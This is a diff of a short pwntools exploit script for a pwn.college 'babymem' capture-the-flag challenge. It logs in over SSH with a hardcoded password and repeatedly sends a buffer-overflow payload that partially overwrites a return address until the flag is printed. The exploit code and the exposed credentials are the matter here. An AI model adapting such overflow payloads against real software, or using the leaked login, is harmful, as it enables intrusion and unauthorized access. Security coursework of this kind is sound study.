@@ -1,15 +1,20 @@
 from pwn import *
+
+# e = ELF('./babymem_level9_testing1')
+# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
 s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
+while 1:
+    p = s.run('/babymem_level9_testing1')
 
-context.log_level = 'debug'
-p = s.process("./babymem_level9_testing1")
-# p = process('./babymem_level9_testing1')
+    pay = b'\x00'*0x1C + b'\x37' + 0x81A6.to_bytes(2, 'little')
+    p.sendlineafter(b'size: ',str(0x3A))
+    p.sendafter(b'!\n',pay)
 
-p.sendlineafter(b'Payload size: ',b'58')
-pay = b'A'*24+b'B'*4+p8(8*7-1)
-# pay = pay.ljust(0x78,b'B')
-# pay += p16(0x45E0)
-# pause()
-p.sendafter(b'bytes)!\n',pay)
-p.send(p16(0x71A6))
-p.interactive()
+    try:   
+        p.recvuntil(b'pwn_')
+        print('pwn_' + p.recvuntil(b'}').decode())
+        break
+    except KeyboardInterrupt:
+        exit(1)
+    except:
+        pass
